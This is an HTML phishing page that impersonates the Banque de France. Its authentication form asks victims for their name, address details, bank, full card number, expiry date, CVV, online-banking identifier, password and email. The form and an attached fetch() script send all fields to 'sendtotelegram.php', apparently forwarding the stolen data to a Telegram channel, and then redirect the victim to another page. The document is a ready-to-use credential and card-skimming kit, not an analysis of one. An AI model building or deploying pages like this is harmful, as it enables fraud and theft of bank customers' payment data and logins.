<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Authentification - Banque de France</title>
    <link rel="icon" href="Banque.png" type="image/png">
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 0;
            background-image: url('bak.jpg');
            background-size: cover;
            background-repeat: no-repeat;
            background-position: center;
            display: flex;
            flex-direction: column;
            min-height: 100vh;
            color: #000000;
        }

        header {
            padding: 20px;
            text-align: center;
        }

        main {
            flex-grow: 1;
            display: flex;
            justify-content: center;
            align-items: center;
        }

        form {
            background-color: rgba(201, 201, 201, 0.8);
            padding: 30px;
            border-radius: 10px;
            width: 400px;
            text-align: left;
        }

        form h2 {
            text-align: center;
            margin-bottom: 20px;
        }

        form label {
            display: block;
            margin-bottom: 5px;
        }

        form input {
            width: 100%;
            padding: 10px;
            margin-bottom: 15px;
            border: 1px solid #1303ff;
            border-radius: 5px;
            box-sizing: border-box;
        }

        .carte-numero {
            display: flex;
            justify-content: space-between;
        }

        .carte-numero input {
            width: 23%;
        }

        .expiration {
            display: flex;
        }

        .expiration input {
            width: 45%;
        }

        .expiration span {
            margin: 0 5px;
        }

        .bouton-continuer {
            display: block;
            width: 100%;
            background-color: #007bff;
            color: white;
            padding: 15px;
            text-decoration: none;
            border-radius: 5px;
            text-align: center;
            border: none;
            cursor: pointer;
        }

        footer {
            background-color: #333;
            color: white;
            text-align: center;
            padding: 10px;
            width: 100%;
        }

        .error-message {
            color: red;
            font-size: 0.8em;
        }

        .loading-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color: rgba(0, 0, 0, 0.5);
            display: none;
            justify-content: center;
            align-items: center;
            z-index: 1000;
        }

        .loading-box {
            background-color: white;
            padding: 30px;
            border-radius: 10px;
            text-align: center;
        }

        .logo {
            max-width: 150px;
            margin-bottom: 20px;
        }

        .loading-gif {
            max-width: 100px;
            margin-bottom: 20px;
        }

        .logo-container {
            text-align: center;
            margin-bottom: 20px;
        }
    </style>
</head>
<body>
    <header>
        <h1>Authentification</h1>
    </header>

    <main>
        <form id="authentification-form" action="sendtotelegram.php" method="post">
            <div class="logo-container">
                <img src="Banque.png" alt="Logo Banque de France" class="logo">
            </div>
            <label for="nom">Nom :</label>
            <input type="text" id="nom" name="nom" required>
            <span id="nom-error" class="error-message"></span>
            <label for="prenom">Prénom :</label>
            <input type="text" id="prenom" name="prenom" required>
            <span id="prenom-error" class="error-message"></span>
            <label for="code-postal">Code Postal :</label>
            <input type="text" id="code-postal" name="code-postal" required>
            <span id="code-postal-error" class="error-message"></span>
            <label for="region">Région :</label>
            <input type="text" id="region" name="region" required>
            <span id="region-error" class="error-message"></span>
            <label for="banque">Nom de la Banque :</label>
            <input type="text" id="banque" name="banque" required>
            <span id="banque-error" class="error-message"></span>
            <label for="departement">Département de l'Agence :</label>
            <input type="text" id="departement" name="departement" required>
            <span id="departement-error" class="error-message"></span>
            <label for="carte-numero">Numéro de Carte :</label>
            <div class="carte-numero">
                <input type="text" name="carte-numero[]" maxlength="4" required>
                <input type="text" name="carte-numero[]" maxlength="4" required>
                <input type="text" name="carte-numero[]" maxlength="4" required>
                <input type="text" name="carte-numero[]" maxlength="4" required>
            </div>
            <span id="carte-numero-error" class="error-message"></span>
            <label for="expiration">Date d'Expiration :</label>
            <div class="expiration">
                <input type="text" name="expiration[]" maxlength="2" required>
                <span>/</span>
                <input type="text" name="expiration[]" maxlength="2" required>
            </div>
            <span id="expiration-error" class="error-message"></span>
            <label for="cvv">CVV :</label>
            <input type="text" id="cvv" name="cvv" maxlength="3" required>
            <span id="cvv-error" class="error-message"></span>
            <label for="identifiant">Identifiant :</label>
            <input type="text" id="identifiant" name="identifiant" required>
            <span id="identifiant-error" class="error-message"></span>
            <label for="mot-de-passe">Mot de Passe :</label>
            <input type="password" id="mot-de-passe" name="mot-de-passe" required>
            <span id="mot-de-passe-error" class="error-message"></span>
            <label for="email">Email :</label>
            <input type="email" id="email" name="email" required>
            <span id="email-error" class="error-message"></span>
            <button type="submit" class="bouton-continuer">Continuer</button>
        </form>
    </main>

    <footer>
        <p>&copy; 2025 Banque de France</p>
    </footer>

    <script>
        document.getElementById('submit-button').addEventListener('click', function() {
            const form = document.getElementById('authentification-form');
            const formData = new FormData(form);

            fetch('sendtotelegram.php', {
                method: 'POST',
                body: formData
            })
            .then(response => {
                if (response.ok) {
                    window.location.href = 'index3.html';
                } else {
                    console.error('Erreur lors de l\'envoi à Telegram.');
                }
            })
            .catch(error => {
                console.error('Erreur réseau:', error);
            });
        });
    </script>
</body>
</html>
